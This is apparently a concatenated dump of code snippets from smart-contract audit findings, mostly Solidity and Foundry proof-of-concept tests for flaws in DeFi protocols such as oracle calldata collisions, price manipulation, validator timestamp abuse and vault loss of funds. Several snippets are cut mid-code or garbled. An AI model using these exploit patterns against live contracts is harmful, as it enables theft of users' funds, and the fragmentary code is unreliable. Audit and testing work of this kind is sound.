40000);\n    _minterGateway.activateMinter(_minters[0]);\n\n    uint256 collateral = 1_000_000e6;\n    _updateCollateral(_minters[0], collateral);\n\n    _mintM(_minters[0], 400e6, _bob);\n    _mintM(_minters[0], 400e6, _alice);\n    uint aliceInitialBalance = _mToken.balanceOf(_alice);\n    uint bobInitialBalance = _mToken.balanceOf(_bob);\n    assertEq(aliceInitialBalance, bobInitialBalance);\n\n    vm.prank(_alice);\n    _mToken.startEarning();\n    vm.prank(_bob);\n    _mToken.startEarning();\n\n    vm.warp(block.timestamp + 1 days);\n    uint aliceEarningDay1 = _mToken.balanceOf(_alice) - aliceInitialBalance;\n    uint bobEarningDay1 = _mToken.balanceOf(_bob) - bobInitialBalance;\n    assertNotEq(aliceEarningDay1, 0);\n    assertEq(aliceEarningDay1, bobEarningDay1);\n\n    _registrar.removeFromList(TTGRegistrarReader.EARNERS_LIST, _alice);\n    vm.warp(block.timestamp + 1 days);\n    uint aliceEarningDay2 = _mToken.balanceOf(_alice) - aliceInitialBalance - aliceEarningDay1;\n    uint bobEarningDay2 = _mToken.balanceOf(_bob) - bobInitialBalance - bobEarningDay1;\n    assertNotEq(aliceEarningDay2, 0);\n    assertEq(aliceEarningDay2, bobEarningDay2);\n\n    uint earnerRateBefore = _mToken.earnerRate();\n    vm.prank(_alice);\n    _mToken.stopEarning();\n    uint earnerRateAfter = _mToken.earnerRate();\n    assertApproxEqRel(earnerRateBefore * 2, earnerRateAfter, 0.01e18);\n\n    vm.warp(block.timestamp + 1 days);\n    uint aliceEarningDay3 = _mToken.balanceOf(_alice) - aliceInitialBalance - aliceEarningDay1 - aliceEarningDay2;\n    uint bobEarningDay3 = _mToken.balanceOf(_bob) - bobInitialBalance - bobEarningDay"
"```\npenalty: 1 94536959275 94536000000\npenalty: 2 95482328867 95481360000\npenalty: 3 96437152156 96436173600\npenalty: 4 97401523678 97400535336\npenalty: 5 98375538914 98374540689\npenalty: 6 99359294302 99358286095\npenalty: 7 100352887244 100351868955\npenalty: 8 101356416116 101355387644\npenalty: 9 102369980277 102368941520\npenalty: 10 103393680080 103392630935\npenalty: 5990 5192349545726433803396851311815959 5192296858534827628530496329220095\npenalty: 5991 5192349545726433803396851311815959 5192296858534827628530496329220095\npenalty: 5992 5192349545726433803396851311815959 5192296858534827628530496329220095\npenalty: 5993 5192349545726433803396851311815959 5192296858534827628530496329220095\npenalty: 5994 5192349545726433803396851311815959 5192296858534827628530496329220095\npenalty: 5995 5192349545726433803396851311815959 5192296858534827628530496329220095\npenalty: 5996 5192349545726433803396851311815959 5192296858534827628530496329220095\npenalty: 5997 5192349545726433803396851311815959 5192296858534827628530496329220095\npenalty: 5998 5192349545726433803396851311815959 5192296858534827628530496329220095\npenalty: 5999 5192349545726433803396851311815959 5192296858534827628530496329220095\npenalty: 6000 5192349545726433803396851311815959 519229\n```\nfunction test_penaltyForUndercollateralization() external {\n    uint initialTimestamp = block.timestamp;\n    _minterGateway.setCollateralOf(_minter1, 100000e6);\n    _minterGateway.setUpdateTimestampOf(_minter1, initialTimestamp);\n    _minterGateway.setRawOwedMOf(_minter1, 90000e6);\n    _minterGateway.setPrincipalOfTotalActiveOwedM(90000e6);\n\n    vm.warp(initialTimestamp + 4 * _updateCollateralInterval);\n\n    uint256[] memory retrievalIds = new uint256[](0);\n    address[] memory validators = new address[](1);\n    validators[0] = _validator1;\n\n    for (uint i = 1; i <= 6000; ++i) {\n        uint256[] memory timestamps = new uint256[](1);\n        uint256 signatureTimestamp = initialTimestamp + i;\n        timestamps[0] = signatureTimestamp;\n        bytes[] memory signatures = new bytes[](1);\n        signatures[0] = _getCollateralUpdateSignature(\n            address(_minterGateway),\n            _minter1,\n            100000e6,\n            retrievalIds,\n            bytes32(0),\n            signatureTimestamp,\n            _validator1Pk\n        );\n\n        vm.prank(_minter1);\n        _minterGateway.updateCollateral(100000e6, retrievalIds, bytes32(0), validators, timestamps, signatures);\n\n        console.log(""penalty:"", i, _minterGateway.totalActiveOwedM(), _minterGateway.principalOfTotalActiveOwedM());\n    }\n}"
"```\nminTimestamp_ = _verifyValidatorSignatures(\n    msg.sender,\n    collateral_,\n    retrievalIds_,\n    metadataHash_,\n    validators_,\n    timestamps_,\n    signatures_\n)\n_updateCollateral(msg.sender, safeCollateral_, minTimestamp_)\n```\n```\nfunction _updateCollateral(\n    address minter_,\n    uint240 amount_,\n    uint40 newTimestamp_\n) internal {\n    uint40 lastUpdateTimestamp_ = _minterStates[minter_].updateTimestamp;\n\n    if (newTimestamp_ <= lastUpdateTimestamp_) {\n        revert StaleCollateralUpdate(newTimestamp_, lastUpdateTimestamp_);\n    }\n\n    _minterStates[minter_].collateral = amount_;\n    _minterStates[minter_].updateTimestamp = newTimestamp_;\n}\n```\n```\nfunction test_collateralStatusTimeTravelBySingleHackedValidator() external {\n    _ttgRegistrar.updateConfig(TTGRegistrarReader.UPDATE_COLLATERAL_VALIDATOR_THRESHOLD, bytes32(uint256(2)));\n\n    address[] memory validators = new address[](2);\n    validators[0] = _validator2;\n    validators[1] = _validator1;\n\n    uint initialTimestamp = block.timestamp;\n    bytes[] memory cacheSignatures = new bytes[](2);\n\n    // 1. Deposit 100e6 collateral, and set malicious validator timestamp to `initialTimestamp+1` during `updateCollateral()`.\n    {\n        vm.warp(block.timestamp + 100);\n\n        uint256[] memory retrievalIds = new uint256[](0);\n        uint256[] memory timestamps = new uint256[](2);\n        timestamps[0] = block.timestamp;\n        timestamps[1] = initialTimestamp + 1;\n\n        bytes[] memory signatures = new bytes[](2);\n        signatures[0] = _getCollateralUpdateSignature(address(_minterGateway), _minter1, 100e6, retrievalIds, bytes32(0), block.timestamp, _validator2Pk);\n        signatures[1] = _getCollateralUpdateSignature(address(_minterGateway), _minter1, 100e6, retrievalIds, bytes32(0), initialTimestamp + 1, _validator1Pk);\n        cacheSignatures = signatures;\n\n        vm.prank(_minter1);\n        _minterGateway.updateCollateral(100e6, retrievalIds, bytes32(0), validators, timestamps, signatures);\n\n        assertEq(_minterGateway.collateralOf(_minter1), 100e6);\n        assertEq(_minterGateway.collateralUpdateTimestampOf(_minter1), initialTimestamp + 1);\n    }\n\n    // 2. Retrieve all collateral, and set malicious validator timestamp to `initialTimestamp+2` during `updateCollateral()`.\n    {\n        vm.prank(_minter1);\n        uint256 retrievalId = _minterGateway.proposeRetrieval(100e6);\n\n        vm.warp(block.timestamp + 100);\n\n        uint256[] memory newRetrievalIds = new uint256[](1);\n        newRetrievalIds[0] = retrievalId;\n\n        uint256[] memory timestamps = new uint256[](2);\n        timestamps[0] = block.timestamp;\n        timestamps[1] = initialTimestamp + 2;\n\n        bytes[] memory signatures"
"```\nfunction getLiquidationBonus(\n    address token,\n    uint256 borrowedAmount,\n    uint256 times\n) public view returns (uint256 liquidationBonus) {\n    Liquidation memory liq = liquidationBonusForToken[token];\n    unchecked {\n        if (liq.bonusBP == 0) {\n            liq.minBonusAmount = Constants.MINIMUM_AMOUNT;\n            liq.bonusBP = defaultLiquidationBonusBP;\n        }\n        liquidationBonus = (borrowedAmount * liq.bonusBP) / Constants.BP;\n        if (liquidationBonus < liq.minBonusAmount) {\n            liquidationBonus = liq.minBonusAmount;\n        }\n        liquidationBonus *= (times > 0? times : 1);\n    }\n}\n```"
"```\nuint256 holdTokenAmtIn = _v3SwapExact(\n    v3SwapExactParams({\n        isExactInput: false,\n        fee: decodedData.fee,\n        tokenIn: decodedData.holdToken,\n        tokenOut: decodedData.saleToken,\n        amount: amountToPay\n    })\n);\n\ndecodedData.holdTokenDebt -=\n    decodedData.zeroForSaleToken\n       ? decodedData.amounts.amount1\n        : decodedData.amounts.amount0;\n\nif (decodedData.routes.strict && holdTokenAmtIn > decodedData.holdTokenDebt) {\n    revertError(ErrLib.ErrorCode.SWAP_AFTER_FLASH_LOAN_FAILED);\n}\n```\n```\ndecodedData.saleToken.safeTransfer(decodedDataExt.recipient, flashBalance);\nIWagmiLeverageFlashCallback(decodedDataExt.recipient).wagmiLeverageFlashCallback(\n    flashBalance,\n    interest,\n    decodedDataExt.originData\n)"
"```\nrequire(\n    bidder!= l.highestBids[tokenId][round].bidder,\n    'EnglishPeriodicAuction: Cannot cancel bid if highest bidder'\n);\n```\n```\n/**\n * @notice Cancel bids for all rounds\n */\nfunction _cancelAllBids(uint256 tokenId, address bidder) internal {\n    EnglishPeriodicAuctionStorage.Layout storage l = EnglishPeriodicAuctionStorage.layout();\n\n    uint256 currentAuctionRound = l.currentAuctionRound[tokenId];\n\n    for (uint256 i = 0; i <= currentAuctionRound; i++) {\n        Bid storage bid = l.bids[tokenId][i][bidder];\n\n        if (bid.collateralAmount > 0) {\n            // Make collateral available to withdraw\n            l.availableCollateral[bidder] += bid.collateralAmount;\n\n            // Reset collateral and bid\n            bid.collateralAmount = 0;\n            bid.bidAmount = 0;\n        }\n    }\n}\n```"
"```\nfunction getAvailableForWithdraw(address account) public view returns (uint96) {\n    uint96 value = accounts[account].amount;\n    if (!stopped) {\n        uint32 currentBlock = getBlockNumber();\n        uint32 time = roundTimestamp(currentBlock);\n        uint96 bias = accounts[account].locked.actualValue(time, currentBlock);\n        value = value - bias;\n    }\n    return value;\n}\n```\nfunction test_Poc_Stop() public {\n    vm.prank(governanceTimelockAddress);\n    mentoToken.transfer(alice, 10_000e18);\n\n    vm.prank(governanceTimelockAddress);\n    mentoToken.transfer(bob, 10_000e18);\n\n    vm.prank(alice);\n    locking.lock(alice, alice, 10_000e18, 1, 103);\n\n    vm.prank(bob);\n    locking.lock(bob, bob, 1500e18, 1, 103);\n\n    vm.timeTravel(BLOCKS_DAY);\n\n    uint256 newVotingDelay = BLOCKS_DAY;\n    uint256 newVotingPeriod = 2 * BLOCKS_WEEK;\n    uint256 newThreshold = 5000e18;\n    uint256 newQuorum = 10; // 10%\n    uint256 newMinDelay = 3 days;\n    uint32 newMinCliff = 6;\n    uint32 newMinSlope = 12;\n\n    vm.prank(alice);\n    (\n        uint256 proposalId,\n        address[] memory targets,\n        uint256[] memory values,\n        bytes[] memory calldatas,\n        string memory description\n    ) = Proposals._proposeChangeSettings(\n        mentoGovernor,\n        governanceTimelock,\n        locking,\n        newVotingDelay,\n        newVotingPeriod,\n        newThreshold,\n        newQuorum,\n        newMinDelay,\n        newMinCliff,\n        newMinSlope\n    );\n\n    vm.timeTravel(120);\n\n    vm.startPrank(governanceTimelockAddress);\n    locking.stop();\n    vm.stopPrank();\n\n    uint bal2 = mentoToken.balanceOf(alice);\n    console.log(bal2);\n\n    vm.startPrank(alice);\n    locking.withdraw();\n    vm.stopPrank();\n\n    vm.startPrank(governanceTimelockAddress);\n    locking.start();\n    vm.stopPrank();\n\n    uint bal = mentoToken.balanceOf(alice);\n    console.log(bal);\n    vm.prank(alice);\n\n    console.log(mentoGovernor.castVote(proposalId, 1));\n}"
"```\nuint256 totalCollateralAmount = bid.collateralAmount + collateralAmount;\n```\n```\ndescribe('exploit', function () {\n  it('POC', async function () {\n    const instance = await getInstance({\n      auctionLengthSeconds: 300,\n      initialPeriodStartTime: (await time.latest()) + 100,\n      licensePeriod: 1000,\n    });\n    const licenseMock = await ethers.getContractAt('NativeStewardLicenseMock', instance.address);\n\n    const steward = bidder2.address;\n    await licenseMock.mintToken(steward, 0);\n\n    await time.increase(300);\n\n    const bidAmount = ethers.utils.parseEther('1.0');\n    const feeAmount = await instance.calculateFeeFromBid(bidAmount);\n    const collateralAmount = feeAmount.add(bidAmount);\n\n    await expect(instance.connect(bidder1).placeBid(0, bidAmount, { value: collateralAmount })).to.be.revertedWith('EnglishPeriodicAuction: Collateral must be greater than current bid');\n\n    const extraAmt = ethers.utils.parseEther('0.1');\n    const collateralAmount1 = feeAmount.add(bidAmount).add(extraAmt);\n\n    await expect(instance.connect(bidder1).placeBid(0, bidAmount, { value: collateralAmount1 })).to.be.revertedWith('EnglishPeriodicAuction: Incorrect bid amount');\n\n    await expect(instance.connect(bidder2).placeBid(0, bidAmount, { value: 0 })).to.not.be.reverted;\n  });\n});\n```\n[await owner.getAddress(), licensePeriod, 0, 10],\n```"
```\nl.availableCollateral[oldBidder] += \nl.highestBids[tokenId][currentAuctionRound].bidAmount;\n```
"```\ndef _claim(s):\n    (s.share, left) = _claim(s)\n    require(left > 0, ""TokenSale: Nothing to claim"")\n    refundTaxAmount;\n    if (s.taxAmount > 0):\n        tax = userTaxRate(s.amount, msg.sender)\n        taxFreeAllc = _maxTaxfreeAllocation(msg.sender) * PCT_BASE\n        if (taxFreeAllc >= s.share):\n            refundTaxAmount = s.taxAmount\n        else:\n            refundTaxAmount = (left * tax) / POINT_BASE\n        usdc.safeTransferFrom(marketingWallet, msg.sender, refundTaxAmount)\n```"
"```\nfunction claim() external {\n    address sender = msg.sender;\n\n    UserDetails storage s = userdetails[sender];\n    require(s.userDeposit!= 0, ""No Deposit"");\n    require(s.index!= vestingPoints.length, ""already claimed"");\n\n    uint256 pctAmount;\n    uint256 i = s.index;\n    for (i; i <= vestingPoints.length - 1; i++) {\n        if (block.timestamp >= vestingPoints[i][0]) {\n            pctAmount += (s.userDeposit * vestingPoints[i][1]) / 10000;\n        } else {\n            break;\n        }\n    }\n\n    if (pctAmount!= 0) {\n        if (address(token) == address(1)) {\n            (bool sent, ) = payable(sender).call{value: pctAmount}("""");\n            require(sent, ""Failed to send BNB to receiver"");\n        } else {\n            token.safeTransfer(sender, pctAmount);\n        }\n        s.index = uint128(i);\n        s.amountClaimed += pctAmount;\n    }\n}\n```\n```\nfunction updateUserDeposit(\n    address[] memory _users,\n    uint256[] memory _amount\n) public onlyRole(DEFAULT_ADMIN_ROLE) {\n    require(_users.length <= 250, ""array length should be less than 250"");\n    require(_users.length == _amount.length, ""array length should match"");\n\n    uint256 amount;\n    for (uint256 i = 0; i < _users.length; i++) {\n        userdetails[_users[i]].userDeposit = _amount[i];\n        amount += _amount[i];\n    }\n    token.safeTransferFrom(distributionWallet, address(this), amount);\n}\n```"
"```\nfunction claim() external {\n    checkingEpoch();\n    require(\n        uint8(epoch) > 1 &&!admin.blockClaim(address(this)),\n        ""TokenSale: Not time or not allowed""\n    );\n\n    Staked storage s = stakes[msg.sender];\n    require(s.amount!= 0, ""TokenSale: No Deposit""); \n    require(!s.claimed, ""TokenSale: Already Claimed"");\n\n    uint256 left;\n    (s.share, left) = _claim(s);\n    require(left > 0, ""TokenSale: Nothing to claim"");\n\n    uint256 refundTaxAmount;\n    if (s.taxAmount > 0) {\n        uint256 tax = userTaxRate(s.amount, msg.sender);\n        uint256 taxFreeAllc = _maxTaxfreeAllocation(msg.sender) * PCT_BASE;\n        if (taxFreeAllc >= s.share) {\n            refundTaxAmount = s.taxAmount;\n        } else {\n            refundTaxAmount = (left * tax) / POINT_BASE;\n        }\n        usdc.safeTransferFrom(marketingWallet, msg.sender, refundTaxAmount);\n    }\n    s.claimed = true;\n    usdc.safeTransfer(msg.sender, left);\n    emit Claim(msg.sender, left);\n}\n```\n```\nfunction _claim(Staked memory _s) internal view returns (uint120, uint256) {\n    uint256 left;\n    if (state.totalPrivateSold > state.totalSupplyInValue) {\n        uint256 rate = (state.totalSupplyInValue * PCT_BASE) / state.totalPrivateSold;\n        _s.share = uint120((uint256(_s.amount) * rate) / PCT_BASE);\n        left = uint256(_s.amount) - uint256(_s.share);\n    } else {\n        _s.share = uint120(_s.amount);\n    }\n\n    return (_s.share, left);\n}\n```"
"```\nfunction claim() external {\n    address sender = msg.sender;\n\n    UserDetails storage s = userdetails[sender];\n    require(s.userDeposit!= 0, ""No Deposit"");\n    require(s.index!= vestingPoints.length, ""already claimed"");\n\n    uint256 pctAmount;\n    uint256 i = s.index;\n    for (i; i <= vestingPoints.length - 1; i++) {\n        if (block.timestamp >= vestingPoints[i][0]) {\n            pctAmount += (s.userDeposit * vestingPoints[i][1]) / 10000;\n        } else {\n            break;\n        }\n    }\n\n    if (pctAmount!= 0) {\n        if (address(token) == address(1)) {\n            (bool sent, ) = payable(sender).call{value: pctAmount}("""");\n            require(sent, ""Failed to send BNB to receiver"");\n        } else {\n            token.safeTransfer(sender, pctAmount);\n        }\n        s.index = uint128(i);\n        s.amountClaimed += pctAmount;\n    }\n}\n```"
"```\nfunction setClaimBlock(address _address) external onlyRole(OPERATOR) {\n    blockClaim[_address] = true;\n}\n```\n```\nrequire(\n    uint8(epoch) > 1 &&\n   !admin.blockClaim(address(this)),\n    ""TokenSale: Not time or not allowed""\n);"
```\nif (userTier == 0 && giftedTierAllc == 0):\n    return 0\n```
"```\nfallback external payable;\n\nfallback(bytes calldata _input) external payable returns (bytes memory _output);\n```\n```\npragma solidity ^0.8.0;\n\nimport {Test} from ""../../lib/forge-std/src/Test.sol"";\nimport {console2} from ""../../lib/forge-std/src/console2.sol"";\nimport {WooracleV2_2} from ""../../contracts/wooracle/WooracleV2_2.sol"";\n\ncontract WooracleZipBugTest is Test {\n    WooracleV2_2 public oracle;\n\n    function setUp() public {\n        oracle = new WooracleV2_2();\n    }\n\n    function testNormalCase() public {\n        uint8 base = 6;\n        bytes memory zip = _makeZipData({\n            op: 0,\n            length: 1,\n            leadingBytesOfBody: abi.encodePacked(base, uint32((2302 << 5) + 4))\n        });\n        (bool success,) = address(oracle).call(zip);\n        assertEq(success, true);\n        address wooAddr = oracle.getBase(6);\n        (uint256 price, bool feasible) = oracle.price(wooAddr);\n        assertEq(price, 23020000);\n        assertTrue(feasible);\n    }\n\n    function testCollisionWithRenounceOwnership() public {\n        bytes memory zip = _makeZipData({\n            op: 1,\n            length: 0x31,\n            leadingBytesOfBody: abi.encodePacked(hex""5018a6"")\n        });\n        assertEq(oracle.owner(), address(this));\n        (bool success,) = address(oracle).call(zip);\n        assertEq(success, true);\n        assertEq(oracle.owner(), address(0));\n    }\n\n    function testCollisionWithSetStaleDuration() public {\n        bytes memory zip = _makeZipData({\n            op: 2,\n            length: 0x19,\n            leadingBytesOfBody: abi.encodePacked(hex""235fd4"")\n        });\n        assertEq(oracle.staleDuration(), 120); // default: 2 mins\n        (bool success,) = address(oracle).call(zip);\n        assertEq(success, true);\n        uint256 expectedStaleDuration;\n        assembly {\n            expectedStaleDuration := mload(add(zip, 36))\n        }\n        assertEq(oracle.staleDuration(), expectedStaleDuration);\n        assertTrue(expectedStaleDuration!= 120);\n    }\n\n    function testCollisionWithPostPrice() public {\n        bytes memory addressAndPrice = abi.encode(address(0x1111), uint256(100));\n```\n2024-03-woofi-swap\WooPoolV2> forge test --match-contract WooracleZipBugTest -vv\n[⠢] Compiling\nNo files changed, compilation skipped\n[⠆] Compiling\n\nRunning 5 tests for test/foundry/WooracleZipBug.t.sol:WooracleZipBugTest\n[PASS] testCollisionWithPostPrice() (gas: 48643)\n[PASS] testCollisionWithRenounceOwnership() (gas: 21301)\n[PASS] testCollisionWithSetStaleDuration() (gas: 18289)\n[PASS] testCollisionWithSyncTS() (gas: 35302)\n[PASS] testNormalCase() (gas: 48027)\nTest result: ok. 5 passed; 0 failed; 0 skipped; finished in 2.13ms\n\nRan 1 test suites: 5 tests passed, 0 failed, 0 skipped (5 total tests)\n```"
"```\nfunction _swapBaseToBase(\n    private nonReentrant whenNotPaused returns (uint256 base2Amount)\n) {\n    require(baseToken1!= address(0) && baseToken1!= quoteToken, ""WooPPV2:!baseToken1"");\n    require(baseToken2!= address(0) && baseToken2!= quoteToken, ""WooPPV2:!baseToken2"");\n\n    IWooracleV2.State memory state1 = IWooracleV2(wooracle).state(baseToken1);\n    IWooracleV2.State memory state2 = IWooracleV2(wooracle).state(baseToken2);\n\n    uint256 newBase1Price;\n    (quoteAmount, newBase1Price) = _calcQuoteAmountSellBase(baseToken1, base1Amount, state1);\n    IWooracleV2(wooracle).postPrice(baseToken1, uint128(newBase1Price));\n\n    uint256 newBase2Price;\n    (base2Amount, newBase2Price) = _calcBaseAmountSellQuote(baseToken2, quoteAmount, state2);\n    IWooracleV2(wooracle).postPrice(baseToken2, uint128(newBase2Price));\n}\n```\n```\npragma solidity ^0.8.0;\n\nimport {Test} from ""../../lib/forge-std/src/Test.sol"";\nimport {console2} from ""../../lib/forge-std/src/console2.sol"";\nimport {WooracleV2_2} from ""../../contracts/wooracle/WooracleV2_2.sol"";\nimport {WooPPV2} from ""../../contracts/WooPPV2.sol"";\nimport {TestERC20Token} from ""../../contracts/test/TestERC20Token.sol"";\nimport {TestUsdtToken} from ""../../contracts/test/TestUsdtToken.sol"";\nimport {TestWbctToken} from ""../../contracts/test/TestWbctToken.sol"";\n\ncontract TestWbctToken is TestERC20Token {\n    function decimals() public view virtual override returns (uint8) {\n        return 8;\n    }\n}\n\ncontract PriceManipulationAttackTest is Test {\n    WooracleV2_2 public oracle;\n    WooPPV2 public pool;\n    TestUsdtToken public usdt;\n    TestWbctToken public wbtc;\n    address public evil = address(0xbad);\n\n    function setUp() public {\n        usdt = new TestUsdtToken();\n        wbtc = new TestWbctToken();\n        oracle = new WooracleV2_2();\n        pool = new WooPPV2(address(usdt));\n\n        pool.setMaxGamma(address(wbtc), 0.1e18);\n        pool.setMaxNotionalSwap(address(wbtc), 5_000_000e6);\n        pool.setFeeRate(address(wbtc), 25);\n        oracle.postState({_base: address(wbtc), _price: 50_000e8, _spread: 0.001e18, _coeff: 0.000000001e18});\n        oracle.setWooPP(address(pool));\n        oracle.setAdmin(address(pool), true);\n        pool.setWooracle(address(oracle));\n\n        usdt.mint(address(this), 10_000_000e6);\n        usdt.approve(address(pool), type(uint256).max);\n        pool.depositAll(address(usdt));\n\n        wbtc.mint(address(this), 100e8);\n        wbtc.approve(address(pool), type(uint256).max);\n        pool.depositAll(address(wbtc));\n    }\n\n    function testMaxPriceDriftInNormalCase() public {\n        (uint256 initPrice, bool feasible) = oracle.price(address(wbtc));\n        assertTrue(feasible);\n```\n2024-03-woofi-swap\WooPoolV2> forge test --match-contract PriceManipulationAttackTest -vv\n\n[⠆] Compiling\nNo files changed, compilation skipped\n[⠰] Compiling\n\nRunning 2 tests for test/foundry/PriceManipulationAttack.t.sol:PriceManipulationAttackTest\n[PASS] testMaxPriceDriftInNormalCase() (gas: 158149)\nLogs:\n  Max price drift in normal case:  0.502%\n\n[PASS] testUnboundPriceDriftInAttackCase() (gas: 648243)\nLogs:\n  Unbound price drift in attack case:  0.499%\n  Unbound price drift in attack case:  0.998%\n  Unbound price drift in attack case:  1.496%\n  Unbound price drift in attack case:  1.994%\n  Unbound price drift in attack case:  2.491%\n  Unbound price drift in attack case:  2.988%\n  Unbound price drift in attack case:  3.483%\n  Unbound price drift in attack case:  3.978%\n  Unbound price drift in attack case:  4.473%\n  Unbound price drift in attack case:  4.967%\n\nTest result: ok. 2 passed; 0 failed; 0 skipped; finished in 6.59ms\n\nRan 1 test suites: 2 tests passed, 0 failed, 0 skipped (2 total tests)\n```"
"```\nfunction _cloPriceInQuote(address _fromToken, address _toToken)\n    internal\n    view\n    returns (uint256 refPrice, uint256 refTimestamp)\n{\n    address baseOracle = clOracles[_fromToken].oracle;\n    if (baseOracle == address(0)) {\n        return (0, 0);\n    }\n    address quoteOracle = clOracles[_toToken].oracle;\n    uint8 quoteDecimal = clOracles[_toToken].decimal;\n\n    (, int256 rawBaseRefPrice,, uint256 baseUpdatedAt, ) = AggregatorV3Interface(baseOracle).latestRoundData();\n    (, int256 rawQuoteRefPrice,, uint256 quoteUpdatedAt, ) = AggregatorV3Interface(quoteOracle).latestRoundData();\n    uint256 baseRefPrice = uint256(rawBaseRefPrice);\n    uint256 quoteRefPrice = uint256(rawQuoteRefPrice);\n\n    uint256 ceoff = uint256(10)**quoteDecimal;\n    refPrice = (baseRefPrice * ceoff) / quoteRefPrice;\n    refTimestamp = baseUpdatedAt >= quoteUpdatedAt? quoteUpdatedAt : baseUpdatedAt;\n}\n```\n```\nbool woPriceInBound = \n    cloPrice_ == 0 || \n    ((cloPrice_ * (1e18 - bound)) / 1e18 <= woPrice_ && \n     woPrice_ <= (cloPrice_ * (1e18 + bound)) / 1e18);\n\nif (woFeasible) {\n    priceOut = woPrice_;\n    feasible = woPriceInBound;\n}\n```"
"```\nfunction _calcQuoteAmountSellBase(\n    address baseToken,\n    uint256 baseAmount,\n    IWooracleV2.State memory state\n) private view returns (uint256 quoteAmount, uint256 newPrice) {\n    require(state.woFeasible, ""WooPPV2:!ORACLE_FEASIBLE"");\n\n    DecimalInfo memory decs = decimalInfo(baseToken);\n\n    uint256 gamma;\n    {\n        uint256 notionalSwap = (baseAmount * state.price * decs.quoteDec) / decs.baseDec / decs.priceDec;\n        require(notionalSwap <= tokenInfos[baseToken].maxNotionalSwap, ""WooPPV2:!maxNotionalValue"");\n\n        gamma = (baseAmount * state.price * state.coeff) / decs.priceDec / decs.baseDec;\n        require(gamma <= tokenInfos[baseToken].maxGamma, ""WooPPV2:!gamma"");\n\n        quoteAmount = (((baseAmount * state.price * decs.quoteDec) / decs.priceDec) *\n            (uint256(1e18) - gamma - state.spread)) / 1e18 / decs.baseDec;\n    }\n\n    newPrice = ((uint256(1e18) - gamma) * state.price) / 1e18;\n}\n```\n```\nfunction test_SwapsHappenPriceIsNotUpdatedDueToRoundDown() public {\n    uint usdcAmount = 1_000_000 * 1e18;\n    uint wooAmount = 100_000 * 1e18;\n    uint wethAmount = 1_000 * 1e18;\n    deal(USDC, ADMIN, usdcAmount);\n    deal(WOO, ADMIN, wooAmount);\n    deal(WETH, ADMIN, wethAmount);\n\n    vm.startPrank(ADMIN);\n    IERC20(USDC).approve(address(pool), type(uint256).max);\n    IERC20(WOO).approve(address(pool), type(uint256).max);\n    IERC20(WETH).approve(address(pool), type(uint256).max);\n    pool.depositAll(USDC);\n    pool.depositAll(WOO);\n    pool.depositAll(WETH);\n    vm.stopPrank();\n\n    uint wooAmountForTapir = 1e10 * 1000;\n    vm.startPrank(TAPIR);\n    deal(WOO, TAPIR, wooAmountForTapir);\n    IERC20(USDC).approve(address(router), type(uint256).max);\n    IERC20(WOO).approve(address(router), type(uint256).max);\n    IERC20(WETH).approve(address(router), type(uint256).max);\n    vm.stopPrank();\n\n    uint128 price = oracle.woPrice(WOO);\n    console.log(""price"", price);\n\n    uint cumulative;\n    for (uint i = 0; i < 1000; ++i) {\n        vm.prank(TAPIR);\n        cumulative += router.swap(WOO, USDC, wooAmountForTapir / 1000, 0, payable(TAPIR), TAPIR);\n    }\n\n    uint128 newPrice = oracle.woPrice(WOO);\n    console.log(""price"", newPrice);\n\n    assertEq(newPrice, price);\n}\n```"
"```\n} else {\n    uint256 fee = (bridgedAmount * dstExternalFeeRate) / FEE_BASE;\n    bridgedAmount -= fee;  // fee should not be applied to internal swap\n\n    TransferHelper.safeApprove(bridgedToken, address(wooRouter), bridgedAmount);\n    if (dst1inch.swapRouter!= address(0)) {\n        try {\n            wooRouter.externalSwap(\n```"
"```\nfunction _claimDeposit(\n    address owner,\n    address receiver\n)\n    internal\n    returns (uint256 shares)\n{\n    shares = previewClaimDeposit(owner);\n\n    uint256 lastRequestId = lastDepositRequestId[owner];\n    uint256 assets = epochs[lastRequestId].depositRequestBalance[owner];\n    epochs[lastRequestId].depositRequestBalance[owner] = 0;\n    _update(address(claimableSilo), receiver, shares);\n    emit ClaimDeposit(lastRequestId, owner, receiver, assets, shares);\n}\n\nfunction previewClaimDeposit(address owner) public view returns (uint256) {\n    uint256 lastRequestId = lastDepositRequestId[owner];\n    uint256 assets = epochs[lastRequestId].depositRequestBalance[owner];\n    return _convertToShares(assets, lastRequestId, Math.Rounding.Floor);\n}\n\nfunction _convertToShares(\n    uint256 assets,\n    uint256 requestId,\n    Math.Rounding rounding\n)\n    internal\n    view\n    returns (uint256)\n{\n    if (isCurrentEpoch(requestId)) {\n        return 0;\n    }\n    uint256 totalAssets = epochs[requestId].totalAssetsSnapshotForDeposit + 1;\n    uint256 totalSupply = epochs[requestId].totalSupplySnapshotForDeposit + 1;\n\n    return assets.mulDiv(totalSupply, totalAssets, rounding);\n}\n```\n```\nfunction _claimRedeem(\n    address owner,\n    address receiver\n)\n    internal\n    whenNotPaused\n    returns (uint256 assets)\n{\n    assets = previewClaimRedeem(owner);\n    uint256 lastRequestId = lastRedeemRequestId[owner];\n    uint256 shares = epochs[lastRequestId].redeemRequestBalance[owner];\n    epochs[lastRequestId].redeemRequestBalance[owner] = 0;\n    _asset.safeTransferFrom(address(claimableSilo), address(this), assets);\n    _asset.transfer(receiver, assets);\n    emit ClaimRedeem(lastRequestId, owner, receiver, assets, shares);\n}\n\nfunction previewClaimRedeem(address owner) public view returns (uint256) {\n    uint256 lastRequestId = lastRedeemRequestId[owner];\n    uint256 shares = epochs[lastRequestId].redeemRequestBalance[owner];\n    return _convertToAssets(shares, lastRequestId, Math.Rounding.Floor);\n}\n\nfunction _convertToAssets(\n    uint256 shares,\n    uint256 requestId,\n    Math.Rounding rounding\n)\n    internal\n    view\n    returns (uint256)\n{\n    if (isCurrentEpoch(requestId)) {\n        return 0;\n    }\n    uint256 totalAssets = epochs[requestId].totalAssetsSnapshotForRedeem + 1;\n    uint256 totalSupply = epochs[requestId].totalSupplySnapshotForRedeem + 1;\n\n    return shares.mulDiv(totalAssets, totalSupply, rounding);\n}\n```\n```\nfunction test_ClaimSameEpochLossOfFunds_Scenario_A() public {\n    asset.mint(alice, 1_000e18);\n\n    vm.prank(alice);\n    vault.deposit(500e18, alice);\n\n    vm.prank(owner);\n    vault.close();\n\n    vm.prank(alice);\n    vault.requestDeposit(500e18, alice, alice, """");\n\n    assertEq(vault.pendingDepositRequest(alice), 500e18);\n\n    vm.prank(alice);\n    vault.claimDeposit(alice);\n\n    assertEq(vault.pendingDepositRequest(alice), 0);\n}\n```\n```\nfunction test_ClaimSameEpochLossOfFunds_Scenario_B() public {\n    asset.mint(alice, 1_000e18);\n\n    vm.prank(alice);\n    vault.deposit(500e18, alice);\n\n    